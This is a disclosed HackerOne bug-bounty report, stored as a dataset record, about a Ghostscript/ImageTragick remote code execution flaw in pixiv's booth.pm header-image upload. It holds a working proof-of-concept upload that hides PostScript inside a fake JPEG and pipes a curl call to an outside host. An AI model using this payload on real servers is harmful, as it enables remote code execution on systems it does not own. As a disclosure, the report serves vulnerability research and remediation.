---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '402362'
original_report_id: '402362'
title: RCE due to ImageTragick v2
weakness: Code Injection
team_handle: pixiv
created_at: '2018-08-29T10:23:03.778Z'
disclosed_at: '2021-03-16T15:35:11.606Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 41
asset_identifier: booth.pm
asset_type: URL
max_severity: critical
tags:
- hackerone
- code-injection
---

# RCE due to ImageTragick v2

## Metadata

- HackerOne Report ID: 402362
- Weakness: Code Injection
- Program: pixiv
- Disclosed At: 2021-03-16T15:35:11.606Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello Pixiv team! Your Image processing process suffering from ImageTragick v2. Issue is caused by ghostscript RCE findnings.

How to reproduce:
PATCH /design
Host: manage.booth.pm

send following image:
```
------WebKitFormBoundaryXX05yrKS4g8d9CWh
Content-Disposition: form-data; name="shop[header]"; filename="imagetragick.jpeg"
Content-Type: image/jpeg

%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%curl https://avtohanter.ru/qwetest) currentdevice putdeviceprops
------WebKitFormBoundaryXX05yrKS4g8d9CWh--
```

How to fix:
Update ImageMagick, should help

## Impact

Remote Code Execution

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
